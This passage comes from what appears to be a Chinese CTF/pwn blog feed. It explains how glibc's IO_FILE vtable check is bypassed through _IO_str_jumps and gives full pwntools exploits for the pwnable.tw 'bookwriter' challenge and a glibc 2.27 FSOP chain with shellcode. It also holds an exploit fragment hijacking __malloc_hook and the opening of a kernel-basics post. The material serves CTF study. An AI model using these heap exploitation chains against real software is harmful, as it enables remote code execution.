class="number">0xe0</span>+<span class="number">0x10</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">rce = libc_base + <span class="number">0x4526a</span></span><br><span class="line">size = <span class="number">0x5c5908</span></span><br><span class="line">real_size = <span class="number">0x200000</span></span><br><span class="line">malloc_one(size,p64(<span class="number">0</span>),real_size,<span class="literal">True</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"please input the size to trigger stackoverflow:"</span>)</span><br><span class="line">sh.send(p64(malloc_hook)*<span class="number">4</span> + p64(malloc_hook+<span class="number">0x8</span>))</span><br><span class="line">flush_buff(<span class="number">39</span>)</span><br><span class="line">sh.recvuntil(<span class="string">" trigger stackoverflow: "</span>)</span><br><span class="line">sh.send(p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE_vtable_check</title>
    <url>/year/04/06/cl7iordol000p293fm92d89dn/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>在libc 2.24版本以后，对vtable的劫持进行了检测，但是这并没有增加利用的难度，反而更简单了。</p>
<p>参考：<a href="https://mp.weixin.qq.com/s/RDFsJrgkz4ywAwuFV7Rneg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RDFsJrgkz4ywAwuFV7Rneg</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/#_io_str_jumps-finish" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/#_io_str_jumps-finish</a></p>
<a id="more"></a>

<h2 id="0x01-检测机制"><a href="#0x01-检测机制" class="headerlink" title="0x01 检测机制"></a>0x01 检测机制</h2><p>我还是直接用的bookwriter这道题来绕过vtable的检测。<br>检测函数在/libio/libioP.h中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="comment">//检查vtable指针是否在glibc的vtable段中。</span></span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到glibc中是有一段完整的内存存放着各个vtable，其中<code>__start___libc_IO_vtables</code>指向第一个vtable地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个vtable<code>_IO_str_chk_jumps</code>结束的地址,最后进入<code>_IO_vtable_check</code>触发报错。</p>
<p>进入该函数意味着目前的vtable不是glibc中的vtable，因此<code>_IO_vtable_check</code>判断程序是否使用了外部合法的vtable（重构或是动态链接库中的vtable），如果不是则报错。</p>
<p>glibc2.24中vtable中的check机制可以小结为：</p>
<p>1.判断vtable的地址是否处于glibc中的vtable数组段，是的话，通过检查。2.否则判断是否为外部的合法vtable（重构或是动态链接库中的vtable），是的话，通过检查。3.否则报错，输出<code>Fatal error: glibc detected an invalid stdio handle</code>，程序退出。</p>
<p>所以最终的原因是：exp中的vtable是堆的地址，不在vtable数组中，且无法通过后续的检查，因此才会报错。</p>
<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><p>使用内部的vtable<code>_IO_str_jumps</code>或<code>_IO_wstr_jumps</code>来进行利用</p>
<p>如何利用<code>_IO_str_jumps</code>或<code>_IO_wstr_jumps</code>完成攻击？在vtable的check机制出现后，大佬们发现了vtable数组中存在<code>_IO_str_jumps</code>以及<code>_IO_wstr_jumps</code>两个vtable，<code>_IO_wstr_jumps</code>与<code>_IO_str_jumps</code>功能基本一致，只是<code>_IO_wstr_jumps</code>是处理wchar的，因此这里以<code>_IO_str_jumps</code>为例进行说明，后者利用方法完全相同。</p>
<p><code>_IO_str_jumps</code>的函数表如下</p>
<p><img src="/06/cl7iordol000p293fm92d89dn/1.png" alt></p>
<p>函数表中存在两个函数<code>_IO_str_overflow</code>以及<code>_IO_str_finish</code>，其中<code>_IO_str_finish</code>源代码如下，在文件<code>/libio/strops.c</code>中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); <span class="comment">//执行函数</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>条件：</p>
<ol>
<li>_IO_buf_base 不为空</li>
<li>_flags &amp; _IO_USER_BUF(0x01) 为假</li>
</ol>
<p>构造如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_flags = (binsh_in_libc + <span class="number">0x10</span>) &amp; ~<span class="number">1</span></span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line">vtable = _IO_str_finish - <span class="number">0x18</span></span><br><span class="line">fp+<span class="number">0xe8</span> -&gt; system_addr</span><br></pre></td></tr></table></figure>

<h2 id="0x03-示例-bookwriter"><a href="#0x03-示例-bookwriter" class="headerlink" title="0x03 示例 bookwriter"></a>0x03 示例 bookwriter</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./bookwriter'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10304</span>)</span><br><span class="line">    libc = ELF(<span class="string">'libc_64.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Size of page :'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index of page :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index of page :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_heap</span><span class="params">()</span>:</span></span><br><span class="line">    info(<span class="number">0</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">    heapbase = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">'heapbase: '</span> + hex(heapbase))</span><br><span class="line">    sh.recvuntil(<span class="string">'(yes:1 / no:0) '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> heapbase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Author :'</span>)</span><br><span class="line">sh.send(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1\x0f\x00'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">heap_base =  leak_heap()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">'wwwwwwww'</span>)</span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'wwwwwwww'</span>)</span><br><span class="line">libc_base  = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c5188</span></span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">IO_list_all = libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>] - <span class="number">0x10</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">vatable_addr = libc_base + <span class="number">0x3c37a0</span> - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'\x00'</span>*<span class="number">0x290</span> </span><br><span class="line">payload += p64(<span class="number">0</span>)+ p64(<span class="number">0x61</span>)                <span class="comment"># fake header   # fp</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  + p64(libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>] - <span class="number">0x10</span>) <span class="comment"># fake bk pointer</span></span><br><span class="line">payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>)                   <span class="comment"># fp-&gt;_IO_write_base</span></span><br><span class="line">payload += p64(<span class="number">0</span>)                          <span class="comment"># fp-&gt;_IO_write_end,</span></span><br><span class="line">payload += p64(bin_sh_addr)    <span class="comment"># fp-&gt;_IO_buf_base</span></span><br><span class="line">payload += p64(<span class="number">0</span>) *<span class="number">19</span>                          <span class="comment"># fp-&gt;_mode</span></span><br><span class="line">payload += p64(vatable_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Size of page :'</span>)</span><br><span class="line">sh.sendline(str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x04-2-27下利用fsop执行orw"><a href="#0x04-2-27下利用fsop执行orw" class="headerlink" title="0x04 2.27下利用fsop执行orw"></a>0x04 2.27下利用fsop执行orw</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(<span class="number">0</span>) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index:\n'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'Size:\n'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'Content:\n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index:\n'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'Content:\n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index:\n'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index:\n'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'666'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index:\n'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'Size:\n'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'Content:\n'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    add(i, <span class="number">0x100</span>, <span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    move(i)</span><br><span class="line">move(<span class="number">8</span>)</span><br><span class="line">move(<span class="number">10</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Index:\n'</span>)</span><br><span class="line">sh.sendline(str(<span class="number">7</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'Size:\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'-1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, <span class="string">'a'</span>*<span class="number">0x10f</span> + <span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">libcbase = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">log.success(<span class="string">'libcbase: '</span> + hex(libcbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, <span class="string">'a'</span>*<span class="number">0x10f</span> + <span class="string">'a'</span>*<span class="number">8</span> + <span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">heapbase = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">3312</span></span><br><span class="line">log.success(<span class="string">'heapbase: '</span> + hex(heapbase))</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">'a'</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>) + p64(libcbase + libc.sym[<span class="string">'__malloc_hook'</span>] + <span class="number">0x70</span>) + p64(heapbase + <span class="number">3312</span>) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, <span class="string">'a'</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, <span class="string">'a'</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x60</span>, <span class="string">'a\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    move(i)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, <span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, <span class="string">'a\n'</span>)</span><br><span class="line">move(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x90</span>, <span class="string">'a\n'</span>) </span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov rax,0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,1024</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,rax</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rax,60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heapbase + <span class="number">0x1770</span></span><br><span class="line">frame.rdi = heapbase</span><br><span class="line">frame.rsi = <span class="number">0x5000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">'mprotect'</span>] + libcbase</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x200</span>, str(frame) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x100</span>, <span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x100</span>, p64(heapbase+<span class="number">0x1778</span>) + asm(shellcode) + <span class="string">'\x00\n'</span>)</span><br><span class="line">move(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x90</span>, <span class="string">'a\n'</span>)  <span class="comment">#change this </span></span><br><span class="line"></span><br><span class="line">IO_str_jumps = libcbase + <span class="number">0x3e8360</span></span><br><span class="line">binsh_addr = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0</span>, <span class="comment">#smallbin4file_size</span></span><br><span class="line">                        _IO_read_base = <span class="number">0</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = heapbase + <span class="number">0x1450</span>,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                        )</span><br><span class="line">payload += p64(IO_str_jumps<span class="number">-8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">payload += p64(libcbase + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">53</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x300</span>, payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">file_addr = heapbase + <span class="number">6272</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Index:\n'</span>)</span><br><span class="line">sh.sendline(str(<span class="number">10</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'Size:\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'-1'</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">'a'</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(heapbase + <span class="number">4800</span>) + p64(libcbase + libc.sym[<span class="string">'_IO_list_all'</span>] - <span class="number">0x18</span>) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">gift(<span class="number">11</span>, <span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">8</span> + p64(file_addr) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>IO_FILE</tag>
        <tag>house of orange</tag>
      </tags>
  </entry>
  <entry>
    <title>内核入门</title>
    <url>/year/03/25/cl7iordqb004u293f5eowq5j6/</url>
    <content><![CDATA[<p>最近发现内核pwn题怎么这么多了。。。。感觉发展太快了，学习总结一波吧。</p>
<a id="more"></a>
<h2 id="1-内核简介"><a href="#1-内核简介" class="headerlink" title="1 内核简介"></a>1 内核简介</h2><h3 id="1-1-内核的组成"><a href="#1-1-内核的组成" class="headerlink" title="1.1 内核的组成"></a>1.1 内核的组成</h3><p>通常一个内核由负责响应中断的<code>中断服务程序</code>，负责管理多个进程从而分享处理器时间的的<code>调度程序</code>，负责管理进程地址空间的<code>内存管理程序</code>和网络、进程间通信等<code>系统服务程序</code>共同组成。</p>
<h3 id="1-2-内核与应用程序的交互"><a href="#1-2-内核与应用程序的交互" class="headerlink" title="1.2 内核与应用程序的交互"></a>1.2 内核与应用程序的交互</h3><p>在系统中运行的应用程序通过<code>系统调用</code>来于内核通信。应用程序调用库函数（比如C库函数）再由库函数通过系统调用界面，让内核代其完成各种不同的任务。<br>当硬件设备想和系统通信的时候，它首先要发出一个异步的<code>中断信号</code>去打断处理器的执行，继而打断内核函数的执行。中断通常对应着一个中断号，内核通过这个<code>中断号</code>查找对应的<code>中断服务程序</code>，并调用程序相应和处理中断。许多操作系统的<code>中断服务程序</code>，包括linux的，都不在进程上下文执行。它们在一个与所有进程都无关的、专门的中断上下文中运行。</p>
<p>实际上我们可以将每个处理器在任何指定时间点上的活动必然概括为下列三者之一</p>
<ul>
<li>运行于用户空间，执行用户进程 </li>
<li>运行于内核空间，处于进程上下文，代表某个特定的进程执行</li>
<li>运行于内核空间，处于中断上下文，与任何进程无关，处理某个特定的中断。<br><img src="/25/cl7iordqb004u293f5eowq5j6/1.png" alt></li>
</ul>
<h3 id="1-3-单内核与微内核"><a href="#1-3-单内核与微内核" class="headerlink" title="1.3 单内核与微内核"></a>1.3 单内核与微内核</h3><h4 id="单内核"><a href="#单内核" class="headerlink" title="单内核"></a>单内核</h4><p>通常以单个静态二进制文件的形式存放于磁盘中。所有内核服务都在这样一个大内核地址空间上运行，内核可以直接调用函数，具有简单和性能高的特点。</p>
